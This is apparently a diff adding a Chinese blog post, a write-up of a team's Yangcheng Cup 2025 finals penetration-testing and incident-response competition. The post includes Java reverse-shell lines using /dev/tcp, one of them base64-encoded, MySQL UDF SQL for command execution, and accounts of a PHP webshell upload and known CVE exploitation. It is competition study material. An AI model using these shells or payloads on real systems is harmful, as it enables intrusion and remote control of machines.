@@ -1,0 +1,874 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/chongqing.jpg">
+  <link rel="icon" href="/img/chongqing.jpg">
+  
+
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="sangnigege">
+  <meta name="keywords" content="一个做事不将就的人，阻止他的只有时间">
+  
+    <meta name="description" content="前言 本文所使用的工具可参考以下仓库： Awesome_Pentest_Tools: 一站式渗透测试与红队工具合集，旨在帮助渗透测试人员打造自己的工具链  这是Tony5、jt、yymh、Pinguw的超绝羊城之旅 由于比赛期间时间紧张且并未要求写WP，所以没有保留详细解题步骤。返程飞机上回想赛程，遂作此文，用以分享。 羊城杯决赛分3个方向：  渗透测试 应急响应 数据安全  所有方向的题目都分三">
+<meta property="og:type" content="article">
+<meta property="og:title" content="羊城杯2025决赛">
+<meta property="og:url" content="http://example.com/2026/test44/index.html">
+<meta property="og:site_name" content="重庆森林不在重庆">
+<meta property="og:description" content="前言 本文所使用的工具可参考以下仓库： Awesome_Pentest_Tools: 一站式渗透测试与红队工具合集，旨在帮助渗透测试人员打造自己的工具链  这是Tony5、jt、yymh、Pinguw的超绝羊城之旅 由于比赛期间时间紧张且并未要求写WP，所以没有保留详细解题步骤。返程飞机上回想赛程，遂作此文，用以分享。 羊城杯决赛分3个方向：  渗透测试 应急响应 数据安全  所有方向的题目都分三">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202510272227876.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202510272229363.png">
+<meta property="article:published_time" content="2026-04-15T10:29:35.415Z">
+<meta property="article:modified_time" content="2026-04-15T13:31:03.314Z">
+<meta property="article:author" content="sangnigege">
+<meta property="article:tag" content="WP">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202510272227876.png">
+  
+  
+  
+  <title>羊城杯2025决赛 - 重庆森林不在重庆</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1749284_5i9bdhy70f8.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1736178_k526ubmyhba.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"example.com","root":"/","version":"1.9.8","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":false},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":true,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"leancloud":{"app_id":"TKccC2BvrQ0jKroA5aUdv8tr-gzGzoHsz","app_key":"rSHs3EnI9lT7nQwv5J7fcBnq","server_url":null,"path":"window.location.pathname","ignore_local":false},"umami":{"src":null,"website_id":null,"domains":null,"start_time":"2024-01-01T00:00:00.000Z","token":null,"api_server":null}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+    
+  
+
+
+
+  
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>重庆森林不在重庆</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/" target="_self">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/" target="_self">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/" target="_self">
+                <i class="iconfont icon-category-fill"></i>
+                <span>分类</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/" target="_self">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/" target="_self">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/links/" target="_self">
+                <i class="iconfont icon-link-fill"></i>
+                <span>友链</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="羊城杯2025决赛"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2026-04-15 18:29" pubdate>
+          2026年4月15日 晚上
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          2.1k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          18 分钟
+        
+      </span>
+    
+
+    
+    
+      
+        <span id="leancloud-page-views-container" class="post-meta" style="display: none">
+          <i class="iconfont icon-eye" aria-hidden="true"></i>
+          <span id="leancloud-page-views"></span> 次
+        </span>
+        
+      
+      
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">羊城杯2025决赛</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><blockquote>
+<p>本文所使用的工具可参考以下仓库：</p>
+<p><a target="_blank" rel="noopener" href="https://github.com/sangnigege/Awesome_Pentest_Tools">Awesome_Pentest_Tools: 一站式渗透测试与红队工具合集，旨在帮助渗透测试人员打造自己的工具链</a></p>
+</blockquote>
+<p>这是Tony5、jt、yymh、Pinguw的超绝羊城之旅</p>
+<p>由于比赛期间时间紧张且并未要求写WP，所以没有保留详细解题步骤。返程飞机上回想赛程，遂作此文，用以分享。</p>
+<p>羊城杯决赛分3个方向：</p>
+<ul>
+<li>渗透测试</li>
+<li>应急响应</li>
+<li>数据安全</li>
+</ul>
+<p>所有方向的题目都分三个难度：简单、中等、困难，分数为100、200、300。</p>
+<p>赛题形式大概就是某个公司被打了，让你复现攻击路径的同时溯源攻击者。简单来说，就是先渗透打进去控制机器，再应急响应找攻击者的痕迹，而且三个方向用的是同一个靶机。题目环境实际上就是几个docker，用网桥连起来。</p>
+<p>网络拓扑目前还不太清晰，我们最后是突破到了第三层。</p>
+<blockquote>
+<p>这个拓扑很混乱，到处都是端口映射，导致之前的服务和新的服务串在一起，而且其他端口还有数据安全的服务。</p>
+</blockquote>
+<p>由于本文是赛后回忆，重在讲解思路，不详细讲隧道代理、流量转发的过程，也不分析具体的payload。</p>
+<h1 id="题目解析"><a href="#题目解析" class="headerlink" title="题目解析"></a>题目解析</h1><h2 id="第一层"><a href="#第一层" class="headerlink" title="第一层"></a>第一层</h2><p>入口机器有两个服务，一个WordPress、一个geoserver</p>
+<p>我们按部就班信息收集，在WordPress处用wpscan扫了扫，随手一测<code>robots.txt</code>，发现了flag1。</p>
+<blockquote>
+<p>我们还没进靶机就有人出一血，原来是送分题</p>
+</blockquote>
+<p>识别出WordPress版本为v5.8.12，目录扫描发现有git泄露，用githack拖下来源码，是源码审计找洞。漏扫发现<a target="_blank" rel="noopener" href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-3590.html">CVE-2022-3590</a>，但是手里没这个洞的exp。</p>
+<p>看了看geoserver，<code>searchsploit</code>并没有找到好用的洞，但从收集的一份wp里找到了CVE-2024-36401，而且版本符合。</p>
+<p>curl了一下验证exp可行，这里要讲一个细节，java反弹shell一般有两种方式（做过java sec的同学可能比较了解）：</p>
+<ol>
+<li>数组</li>
+</ol>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">exec(<span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>[]&#123;<span class="hljs-string">&quot;bash&quot;</span>,<span class="hljs-string">&quot;-c&quot;</span>,<span class="hljs-string">&quot;bash -i &gt;&amp; /dev/tcp/xx.xx.xx.xx/6543 0&gt;&amp;1&quot;</span>)<br></code></pre></td></tr></table></figure>
+
+<ol start="2">
+<li>base64</li>
+</ol>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">exec(<span class="hljs-string">&quot;bash -c &#123;echo,YmFzaCAtaSA+Ji9kZXYvdGNwLzEyNy4wLjAuMS84ODg4IDA+JjE=&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;</span>);<br></code></pre></td></tr></table></figure>
+
+<p>如果直接传入<code>Runtime.getRuntime().exec(&quot;bash -i &gt;&amp; /dev/tcp/ip/port 0&gt;&amp;1&quot;);</code>，会被拆分成如下形式，从而报错</p>
+<table>
+<thead>
+<tr>
+<th>1</th>
+<th>2</th>
+<th>3</th>
+<th>4</th>
+<th>5</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>bash</td>
+<td>-i</td>
+<td>&gt;&amp;</td>
+<td>&#x2F;dev&#x2F;tcp&#x2F;ip&#x2F;port</td>
+<td>0&gt;&amp;1</td>
+</tr>
+</tbody></table>
+<p>具体分析可以看墨竹学长的文章：<a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/1908924261168575829">从Java看反弹Shell - 知乎</a></p>
+<p>由于是docker，还以为是容器逃逸，上了linpeas扫了半天也没思路。后来发现全都是docker，渗透竟然用docker环境，好坑。</p>
+<p>jt化身路由器，疯狂反弹shell、转发流量。</p>
+<blockquote>
+<p>我的Kali是NAT的虚拟机，不能直接反弹shell。于是jt起了一个stowaway agent，并映射端口到我的主机，相当于把 jt 当作跳板机进行攻击。</p>
+<p>比完赛想了想，更好的方法是传一个msf的马，我正向连到靶机，再自己搭建隧道，映射端口到pwncat。msf最近没用到就忽略了，耽误了时间，而且搞混了网络拓扑，后续环境出问题的时候也影响了判断</p>
+</blockquote>
+<h2 id="第二层"><a href="#第二层" class="headerlink" title="第二层"></a>第二层</h2><p>我们策略是一直往下打，没思路的就放，于是标准步骤：看网卡、fscan扫端口</p>
+<p>然后session、agent都死了，反弹shell也都断了</p>
+<blockquote>
+<p>这套靶场最难绷的就是抗并发太差了，稍微上点流量就死，连端口都扫不了打个蛋，而且竟有5次重启上限</p>
+<p>一开始以为是服务死了，后来发现是网卡死了。</p>
+</blockquote>
+<p>重启靶机，jt再次疯狂转发流量（人肉路由器这一块）。</p>
+<p>第二层有多个服务：</p>
+<p>一个nginx，一个AI服务，一个类似cms的服务，一个gitlab</p>
+<ol>
+<li><p>nginx版本是1.18.0，没有找到对应的漏洞脚本。</p>
+</li>
+<li><p>AI服务通过<code>searchsploit</code>发现有一个鉴权漏洞，但是没打通，可能是版本对不上。</p>
+</li>
+<li><p>cms服务的话，是一个非框架题，自己找洞，whatweb识别出后端是PHP 7.x写的。</p>
+<p>jt敏锐地发现有文件上传功能，抓包之后敏锐地看到可以json指定后缀名单，于是增加后缀为php，并且成功上传一句话木马，直接一手蚁剑连接拿flag。</p>
+<blockquote>
+<p>解出了一道困难题，豪爽。</p>
+</blockquote>
+</li>
+<li><p>gitlab指纹识别不出版本，密码爆破尝试弱口令，马上死给我们看。</p>
+<p>但是<code>searchsploit</code>搜到了了对应的多个漏洞。由于未授权且猜测是较新的RCE，于是打了CVE-2021-22205，直接拿下一台机器。</p>
+</li>
+</ol>
+<h2 id="第三层"><a href="#第三层" class="headerlink" title="第三层"></a>第三层</h2><p>第三层有MySQL、Redis、PostgreSQL</p>
+<p>在蚁剑里找到了<code>.env</code>文件（注意力惊人），里面有MySQL、Redis的连接密码。</p>
+<blockquote>
+<p>渗透题目没有题目名、题目描述，只有flag1、flag2……</p>
+<p>这种情况下需要自己确定打哪个服务，自己找flag（数据库或者根目录），且无法确定是否需要进一步提权。而且由于混乱的端口映射、脆弱的环境，导致做起来很棘手</p>
+<p>我们打的时候也不是按顺序来，而是通了一个靶机就交，往往flag序号之间会相差很大。好在应急响应有题目描述，通过这个来旁敲侧击，有一个大致的方向</p>
+</blockquote>
+<p>由于应急响应有MySQL，当时思路就确定打MySQL，发现可以打udf从而命令执行</p>
+<p>奇怪的是MDUT打不通，然后上msf（多方法打点的习惯是真有用），有个细节就是msf打MySQL UDF可能不直接给session</p>
+<p>好在之前打过，msf写完<code>.so</code>文件之后，我们navicat连上MySQL用之前的payload：</p>
+<figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs n1ql"><span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span> MySQL.func;<br><span class="hljs-keyword">create</span> <span class="hljs-keyword">function</span> sys_eval returns <span class="hljs-keyword">string</span> soname <span class="hljs-string">&#x27;UIWgSojw.so&#x27;</span>;<br><span class="hljs-keyword">select</span> sys_eval(<span class="hljs-string">&#x27;cat /f*&#x27;</span>);<br></code></pre></td></tr></table></figure>
+
+<p>直接出flag，拿了一血，好爽！</p>
+<blockquote>
+<p>直接冲到了第三名。“计划有变”</p>
+</blockquote>
+<p>有个细节就是这个MySQL环境受限不能弹shell，要手动上马。而且他的echo不接受-e，所以不能用<code>echo -e &quot;\x7fELF&quot;</code>这样的形式，但是有base64可以直接<code>echo &quot;payload&quot; | base64 -d &gt; backdoor</code>。</p>
+<p>顺势拿下两道MySQL应急响应：一道找攻击者的命令执行函数、一道找攻击者IP</p>
+<p>Redis的版本是4.x，在主从复制的范围之内，不过当时把拓扑搞混了，第一次主从复制反弹的IP写错了。恰好主从复制有一个细节，就是打了一次就坏了，再想打只能重启。</p>
+<blockquote>
+<p>由于没搞清楚网络拓扑，当时IP搞混了，第一次失误了。而且前面MDUT打MySQL没打通，又误以为是MDUT的问题，换了Redis-rogue-server。尝试了很多次，但忽略了主从复制不抗打，没想到重启，导致最后也没打通。</p>
+</blockquote>
+<p>这里就放了，后面反过头去看没打通的几个点。</p>
+<p>看了看WordPress源码，感觉像CVE-2022-3590，但这是SSRF，可能还得结合别的洞拿shell。还有提权都没成功，可能也会有flag。</p>
+<p>数据安全Pinguw一个人在做，做了一半。</p>
+<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>最后位居第8，渗透6个flag、应急4个、ds两个</p>
+<p>比较可惜的就是：</p>
+<ul>
+<li>Redis思路、利用手法是对的，但是忽略了重启，不然还有一道应急响应可以做。</li>
+<li>忘了看gitlab那台机器，里面应该有东西</li>
+</ul>
+<blockquote>
+<p>Tony5云：信息收集决定打点思路，技术细节实现漏洞利用</p>
+</blockquote>
+<p>后续没啥思路主要还是信息收集做的不够，Redis是忘了技术细节</p>
+<img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202510272227876.png" srcset="/img/loading.gif" lazyload alt="三等奖一枚" style="zoom:50%;" />
+
+<p>整体来说，羊城杯的题目还是比较经典的，但是环境属实一坨。</p>
+<p>渗透的话，相对贴近现实一些，与传统CTF不同点主要在于需自己收集、判断有效信息（渗透打点像没有题目描述的web题，而且多是实际出现过的漏洞）。线下和线上主要区别在于断网，平时习惯上网搜脚本的话，束缚就比较大。不通网、无AI立马变成原始人，比较考验选手的利用思路和漏洞库。</p>
+<blockquote>
+<p>还有，广东这么暧(nuan)昧(wei)的吗</p>
+</blockquote>
+<img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202510272229363.png" srcset="/img/loading.gif" lazyload alt="男闺蜜这一块" style="zoom:;" />
+
+<blockquote>
+<p>后续拿到第一的wp，发现渗透方面的主要差距在于一些服务的密码爆破，这个用fscan都能出</p>
+<p>但是那个情景</p>
+</blockquote>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/PenTest/" class="category-chain-item">PenTest</a>
+  
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/WP/" class="print-no-link">#WP</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>羊城杯2025决赛</div>
+      <div>http://example.com/2026/test44/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>sangnigege</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2026年4月15日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-cc-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2026/test40/" title="软件安全实验 SEEDlabs 模糊测试技术实验（基于AFL）">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">软件安全实验 SEEDlabs 模糊测试技术实验（基于AFL）</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2026/test34/" title="HCTF2025新生赛">
+                        <span class="hidden-mobile">HCTF2025新生赛</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+  
+  
+    <article id="comments" lazyload>
+      
+  <div id="valine"></div>
+  <script type="text/javascript">
+    Fluid.utils.loadComments('#valine', function() {
+      Fluid.utils.createScript('https://lib.baomitu.com/valine/1.5.1/Valine.min.js', function() {
+        var options = Object.assign(
+          {"appId":"TKccC2BvrQ0jKroA5aUdv8tr-gzGzoHsz","appKey":"rSHs3EnI9lT7nQwv5J7fcBnq","path":"window.location.pathname","placeholder":null,"avatar":"retro","meta":["nick","mail","link"],"requiredFields":[],"pageSize":10,"lang":"zh-CN","highlight":false,"recordIP":false,"serverURLs":"","emojiCDN":null,"emojiMaps":null,"enableQQ":false},
+          {
+            el: "#valine",
+            path: window.location.pathname
+          }
+        )
+        new Valine(options);
+        Fluid.utils.waitElementVisible('#valine .vcontent', () => {
+          var imgSelector = '#valine .vcontent img:not(.vemoji)';
+          Fluid.plugins.imageCaption(imgSelector);
+          Fluid.plugins.fancyBox(imgSelector);
+        })
+      });
+    });
+  </script>
+  <noscript>Please enable JavaScript to view the comments</noscript>
+
+
+    </article>
+  
+
+
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a>
+    </div>
+  
+  
+    <div class="statistics">
+  
+  
+
+  
+    
+      <span id="leancloud-site-pv-container" style="display: none">
+        总访问量 
+        <span id="leancloud-site-pv"></span>
+         次
+      </span>
+    
+    
+      <span id="leancloud-site-uv-container" style="display: none">
+        总访客数 
+        <span id="leancloud-site-uv"></span>
+         人
+      </span>
+    
+    
+
+  
+
+</div>
+
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/5.0.0/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script defer src="/js/leancloud.js" ></script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
